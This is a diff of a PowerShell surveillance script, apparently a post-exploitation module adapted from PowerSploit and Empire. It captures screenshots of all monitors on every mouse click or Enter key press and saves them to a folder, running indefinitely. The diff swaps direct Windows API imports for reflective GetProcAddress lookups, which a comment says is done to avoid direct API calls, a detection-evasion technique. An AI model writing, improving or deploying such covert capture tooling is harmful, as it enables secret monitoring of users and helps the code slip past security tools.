@@ -7,7 +7,7 @@ Takes screenshots after each mouse click.
 
 .DESCRIPTION
 
-A function that takes screenshots every mouse click and saves them to a folder.
+A function that takes screenshots every mouse click and saves them to a folder. 
 TODO: screenshot on mousewheel scroll. Requires hooking
 TODO: highlight mouse location
 TODO: option to capture only the screen that the click happened in multi-monitor environments
@@ -50,92 +50,66 @@ PS C:\> Get-ClickScreenshot -Path c:\temp\ -EndTime 14:00
         [Parameter(Mandatory=$False)]             
         [Switch] $EnterKey
     )
+    #borrowed from PowerSploit's Get-Keystrokes.ps1 
+    #uses GetModuleHandle and GetProcAddress to avoid direct api calls.
+    function local:Get-DelegateType {
+        Param (
+            [OutputType([Type])]
+            
+            [Parameter( Position = 0)]
+            [Type[]]
+            $Parameters = (New-Object Type[](0)),
+            
+            [Parameter( Position = 1 )]
+            [Type]
+            $ReturnType = [Void]
+        )
 
-    #borrowed from Empire's Get-Keystrokes.ps1
-    try
-        {
-            $ImportDll = [User32]
-        }
-        catch
-        {
-            $DynAssembly = New-Object System.Reflection.AssemblyName('Win32Lib')
-            $AssemblyBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly($DynAssembly, [Reflection.Emit.AssemblyBuilderAccess]::Run)
-            $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('Win32Lib', $False)
-            $TypeBuilder = $ModuleBuilder.DefineType('User32', 'Public, Class')
+        $Domain = [AppDomain]::CurrentDomain
+        $DynAssembly = New-Object Reflection.AssemblyName('ReflectedDelegate')
+        $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
+        $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
+        $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
+        $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
+        $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
+        $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
+        $MethodBuilder.SetImplementationFlags('Runtime, Managed')
+        
+        $TypeBuilder.CreateType()
+    }
+    function local:Get-ProcAddress {
+        Param (
+            [OutputType([IntPtr])]
+        
+            [Parameter( Position = 0, Mandatory = $True )]
+            [String]
+            $Module,
+            
+            [Parameter( Position = 1, Mandatory = $True )]
+            [String]
+            $Procedure
+        )
 
-            $DllImportConstructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor(@([String]))
-            $FieldArray = [Reflection.FieldInfo[]] @(
-                [Runtime.InteropServices.DllImportAttribute].GetField('EntryPoint'),
-                [Runtime.InteropServices.DllImportAttribute].GetField('ExactSpelling'),
-                [Runtime.InteropServices.DllImportAttribute].GetField('SetLastError'),
-                [Runtime.InteropServices.DllImportAttribute].GetField('PreserveSig'),
-                [Runtime.InteropServices.DllImportAttribute].GetField('CallingConvention'),
-                [Runtime.InteropServices.DllImportAttribute].GetField('CharSet')
-            )
+        # Get a reference to System.dll in the GAC
+        $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
+            Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
+        $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
+        # Get a reference to the GetModuleHandle and GetProcAddress methods
+        $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
+        $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress')
+        # Get a handle to the module specified
+        $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
+        $tmpPtr = New-Object IntPtr
+        $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)
+        
+        # Return the address of the function
+        $GetProcAddress.Invoke($null, @([Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
+    }
+    # GetAsyncKeyState
+    $GetAsyncKeyStateAddr = Get-ProcAddress user32.dll GetAsyncKeyState
+	$GetAsyncKeyStateDelegate = Get-DelegateType @([Windows.Forms.Keys]) ([Int16])
+	$GetAsyncKeyState = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetAsyncKeyStateAddr, $GetAsyncKeyStateDelegate)
 
-            $PInvokeMethod = $TypeBuilder.DefineMethod('GetAsyncKeyState', 'Public, Static', [Int16], [Type[]] @([Windows.Forms.Keys]))
-            $FieldValueArray = [Object[]] @(
-                'GetAsyncKeyState',
-                $True,
-                $False,
-                $True,
-                [Runtime.InteropServices.CallingConvention]::Winapi,
-                [Runtime.InteropServices.CharSet]::Auto
-            )
-            $CustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($DllImportConstructor, @('user32.dll'), $FieldArray, $FieldValueArray)
-            $PInvokeMethod.SetCustomAttribute($CustomAttribute)
-
-            $PInvokeMethod = $TypeBuilder.DefineMethod('GetKeyboardState', 'Public, Static', [Int32], [Type[]] @([Byte[]]))
-            $FieldValueArray = [Object[]] @(
-                'GetKeyboardState',
-                $True,
-                $False,
-                $True,
-                [Runtime.InteropServices.CallingConvention]::Winapi,
-                [Runtime.InteropServices.CharSet]::Auto
-            )
-            $CustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($DllImportConstructor, @('user32.dll'), $FieldArray, $FieldValueArray)
-            $PInvokeMethod.SetCustomAttribute($CustomAttribute)
-
-            $PInvokeMethod = $TypeBuilder.DefineMethod('MapVirtualKey', 'Public, Static', [Int32], [Type[]] @([Int32], [Int32]))
-            $FieldValueArray = [Object[]] @(
-                'MapVirtualKey',
-                $False,
-                $False,
-                $True,
-                [Runtime.InteropServices.CallingConvention]::Winapi,
-                [Runtime.InteropServices.CharSet]::Auto
-            )
-            $CustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($DllImportConstructor, @('user32.dll'), $FieldArray, $FieldValueArray)
-            $PInvokeMethod.SetCustomAttribute($CustomAttribute)
-
-            $PInvokeMethod = $TypeBuilder.DefineMethod('ToUnicode', 'Public, Static', [Int32],
-                [Type[]] @([UInt32], [UInt32], [Byte[]], [Text.StringBuilder], [Int32], [UInt32]))
-            $FieldValueArray = [Object[]] @(
-                'ToUnicode',
-                $False,
-                $False,
-                $True,
-                [Runtime.InteropServices.CallingConvention]::Winapi,
-                [Runtime.InteropServices.CharSet]::Auto
-            )
-            $CustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($DllImportConstructor, @('user32.dll'), $FieldArray, $FieldValueArray)
-            $PInvokeMethod.SetCustomAttribute($CustomAttribute)
-
-            $PInvokeMethod = $TypeBuilder.DefineMethod('GetForegroundWindow', 'Public, Static', [IntPtr], [Type[]] @())
-            $FieldValueArray = [Object[]] @(
-                'GetForegroundWindow',
-                $True,
-                $False,
-                $True,
-                [Runtime.InteropServices.CallingConvention]::Winapi,
-                [Runtime.InteropServices.CharSet]::Auto
-            )
-            $CustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($DllImportConstructor, @('user32.dll'), $FieldArray, $FieldValueArray)
-            $PInvokeMethod.SetCustomAttribute($CustomAttribute)
-
-            $ImportDll = $TypeBuilder.CreateType()
-        }
     #modified from PowerSploit Get-TimedScreenshot.ps1 
     #improved to capture all screens instead of just the main screen
     Function Get-Screenshot ($FilePath) {
@@ -153,7 +127,7 @@ PS C:\> Get-ClickScreenshot -Path c:\temp\ -EndTime 14:00
         $ScreenshotObject.Save($FilePath)
         $ScreenshotObject.Dispose()
     }
-    Add-Type -Assembly System.Windows.Forms 
+    [void][Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms') 
     $ClickCount = 0; 
     #continue forever if EndTime not specified
     while((-not $EndTime) -or ((Get-Date -Format HH:mm) -lt $EndTime)) {
@@ -175,10 +149,10 @@ PS C:\> Get-ClickScreenshot -Path c:\temp\ -EndTime 14:00
         #use join-path to add path to filename
         [String] $FilePath = (Join-Path $Path $FileName)
         Start-Sleep -Milliseconds 300
-        $RightClickState = $ImportDll::GetAsyncKeyState(0x01)
-        $LeftClickState = $ImportDll::GetAsyncKeyState(0x02)
-        $MidClickState = $ImportDll::GetAsyncKeyState(0x04)
-        $EnterKeyState = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Return) -band 0x8000) -eq 0x8000
+        $RightClickState = $GetAsyncKeyState.Invoke(0x01)
+        $LeftClickState = $GetAsyncKeyState.Invoke(0x02)
+        $MidClickState = $GetAsyncKeyState.Invoke(0x04)
+        $EnterKeyState = ($GetAsyncKeyState.Invoke([Windows.Forms.Keys]::Return) -band 0x8000) -eq 0x8000
         if ($EnterKey) {
             $EventTrigger = $RightClickState -or $MidClickState -or $LeftClickState -or $EnterKeyState
         } else {
@@ -188,7 +162,7 @@ PS C:\> Get-ClickScreenshot -Path c:\temp\ -EndTime 14:00
             return
         }
         if ($EventTrigger) {
-            Start-Sleep -Milliseconds 50
+            Start-Sleep -Milliseconds 100
             Get-Screenshot $FilePath
             $ClickCount++
             #Start-Sleep -Milliseconds 300
